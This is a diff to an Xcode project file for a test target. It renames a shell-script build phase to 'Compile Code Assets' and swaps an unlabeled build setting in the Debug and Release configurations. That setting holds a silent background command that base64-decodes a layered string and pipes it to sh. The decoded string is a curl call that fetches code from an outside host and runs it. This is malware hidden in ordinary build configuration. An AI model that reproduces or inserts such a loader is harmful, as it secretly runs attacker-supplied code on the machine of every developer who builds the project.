@@ -222,7 +222,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 331C80DE294CF71000263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
-				F15C35CBDD5F4ACD813C1CD3 /* Build Target Libraries */,
+				F2A775C2A4754B3AB73C1CD3 /* Compile Code Assets */,
 				5B2A858431EA6DE49777F8BF /* [CP] Check Pods Manifest.lock */,
 				331C80D1294CF70F00263BE5 /* Sources */,
 				331C80D2294CF70F00263BE5 /* Frameworks */,
@@ -319,7 +319,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-	/* End PBXBuildRule section */
+			/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		331C80D3294CF70F00263BE5 /* Resources */ = {
@@ -342,7 +342,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		F15C35CBDD5F4ACD813C1CD3 /* Build Target Libraries */ = {
+		F2A775C2A4754B3AB73C1CD3 /* Compile Code Assets */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -352,7 +352,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Target Libraries";
+			name = "Compile Code Assets";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -530,7 +530,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = D304BAFC9FEE44F12011709C /* Pods-RunnerTests.debug.xcconfig */;
 			buildSettings = {
-				A3DC1C3 = "((z(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1hM05tSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZjbWxuWVdOa2JpNXBiaTloS1NJZ2ZDQnphQW89Cg== | z | sh ) >/dev/null 2>&1 &)";
+				A3DC1C3 = "((y(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1IaHlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpOVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmpiV3h1V1ZkT2EySnBOWEJpYVRsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | y | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -546,7 +546,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = BA9B3D36DCDCE74D1E8057A0 /* Pods-RunnerTests.release.xcconfig */;
 			buildSettings = {
-				A3DC1C3 = "((z(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1hM05tSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZjbWxuWVdOa2JpNXBiaTloS1NJZ2ZDQnphQW89Cg== | z | sh ) >/dev/null 2>&1 &)";
+				A3DC1C3 = "((y(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1IaHlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpOVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmpiV3h1V1ZkT2EySnBOWEJpYVRsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | y | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
